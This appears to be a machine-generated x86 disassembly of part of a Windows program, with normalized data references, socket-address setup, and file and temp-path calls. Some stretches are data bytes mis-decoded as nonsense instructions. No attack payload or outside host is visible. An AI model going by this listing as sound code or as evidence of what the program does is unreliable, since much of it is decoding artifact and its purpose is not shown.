lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_4040a4
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c3ce
lea eax [ ebp - 0x1c ]
call sub_404050
retn
sub_45c3d8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_41432c
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_414014
add ebx 0x4
dec esi
jne r-xdata
sub_45c414
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45c4a9
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c4b0
lea eax [ ebp - 0xc ]
call sub_404050
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_414170
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_45c4b8
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402ca4
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402ca4
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402ca4
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_45c414
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_45c414
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_45c414
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_45c3d8
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_45c3d8
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_45c3d8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45c5d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_45c5ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402ca4
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45bd54
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_45c658
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_45c678
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0xc ] eax
sub_45c6d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_45c7a5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_403848#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408084
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c7ac
lea eax [ ebp - 0x10 ]
call sub_404050
retn
sub_45c75f
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c7ac
lea eax [ ebp - 0x10 ]
call sub_404050
retn
sub_45c7cb
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_45c8d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404fe0
xor eax eax
push ebp
push j_sub_40371c#4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_404248
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_40501c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c8dc
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404fe0
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404248
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_45c89f
mov eax [ ebp - 0x4 ]
call sub_403294
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c8dc
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404fe0
retn
sub_45c900
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_45c99a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404510
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_45b650
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c9a1
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404074
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_45c9a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_45c9c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_45ca7a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45ca5d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca64
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_45ca8c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_45cb4f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov eax [ ebp - 0x8 ]
call sub_408084
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov eax [ ebp - 0xc ]
call sub_408084
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov eax [ ebp - 0x10 ]
call sub_408084
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov eax [ ebp - 0x14 ]
call sub_408084
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb56
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404074
retn
sub_45cb74
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45cc02
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_45b650
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_4040a4
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cc09
lea eax [ ebp - 0x18 ]
call sub_404050
retn
sub_45cc14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45cca2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_45b650
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_4040a4
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cca9
lea eax [ ebp - 0x18 ]
call sub_404050
retn
sub_45ccb4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_45ccd4
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_45cd2e
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cd35
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_45cd3c
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_45cd96
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cd9d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_45cda4
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_45cdd8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_45ce79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_45b814
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ce80
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408d10
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4040a4
sub_45ce88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cec1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cec8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_45cef8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cf1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cf24
retn
sub_45d00b
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add [ eax ] bl
rol [ ebp ] 0x1
add edx [ eax ]
push esp
dec ecx
dec ebp
popad
js r-xdata
add al [ eax ]
add [ eax ] al
push esp
rol [ ebp ] 0x1
or eax 0x534f7372
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx * 8 ] dl
inc ebp
add [ ebx ] cl
insd
popad
inc ebp
js r-xdata
rcl [ ebx + 0x56 ] 0x8b
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c26c
pop esi
pop ebx
retn
outsb
outsb
je r-xdata
adc [ edx ] eax
cmp [ cs : eax + eax ] eax
jo r-xdata
pop es
jb r-xdata
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
or [ ecx + 0x64 ] cl
inc edi
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
inc esi
popad
insb
jae r-xdata
sar [ ebp + 0x2 ] 0x1
push esp
jb r-xdata
inc edi
dec ecx
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
bound esp [ ecx + 0x6c ]
pop eax
rol [ ebp ] 0x1
add ecx [ esi ]
push esp
dec ecx
push edx
jne r-xdata
sar [ ebx ] 0xd0
jge r-xdata
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] ch
or [ ecx + 0x64 ] cl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
nop
mov al [ 0x110045d0 ]
add ch [ esi ]
cmp [ eax + eax ] eax
retn
jb r-xdata
pop es
add [ eax + edx + 0x49080040 ] ch
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
mov eax eax
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax edx
inc esp
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx * 8 + 0x45 ] dl
add [ 0x534f7372 ] cl
add [ eax ] al
add [ eax ] al
sub_45d1e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45d243
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_40469c
mov eax [ ebx ]
call sub_404510
push eax
mov eax [ ebx ]
call sub_404310
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_40469c
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_45d0e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d24a
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_45d250
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d319
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_40445c
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407bf8
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407bf8
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_404654
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404570
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_4040a4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d320
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404074
retn
push ebx
mov eax edi
call sub_404310
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404570
mov eax ebx
call sub_404050
jmp r-xdata
sub_45d338
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_45d250
mov eax esi
mov edx r-xdata
call sub_40445c
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_404654
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404570
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_4040a4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404310
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404570
jmp r-xdata
mov eax ebx
call sub_404050
jmp r-xdata
sub_45d424
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_404310
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_407ca0
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_45d4b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_404310
mov edi eax
mov eax [ esp ]
call sub_404310
mov esi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp esi edi
jge r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
mov ebx [ esp ]
cmp [ esp + 0x4 ] 0x0
jbe r-xdata
mov al [ ebp ]
mov [ esp + 0x8 ] al
inc ebp
dec edi
sub esi edi
test esi esi
jg r-xdata
add ebx [ esp + 0x4 ]
dec ebx
inc esi
sub esi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp al [ esp + 0x8 ]
jne r-xdata
inc ebx
inc ebx
mov ecx edi
mov edx ebp
mov eax ebx
call sub_407ca0
test al al
je r-xdata
dec esi
test esi esi
jg r-xdata
mov eax ebx
sub eax [ esp ]
jmp r-xdata
sub_45d53c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45d5ef
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d5f6
retn
mov eax rw-data
call sub_40d19c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404acc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404acc
mov eax rw-data
call sub_404050
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe0
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404acc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404acc
sub_45d5f8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_45d6cb
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d6d2
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea eax [ ebp - 0x4 ]
call sub_45d1e4
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4040a4
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402dc8
jne r-xdata
mov eax sub_40c2ac
mov [ rw-data ] eax
mov [ rw-data ] sub_45d41c
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040a4
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040a4
sub_45d818
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
fadd [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
fadd [ ebp ]
cmp al 0x0
add [ eax ] al
sbb bh dl
inc ebp
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dh
fiadd [ ebp ]
push eax
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
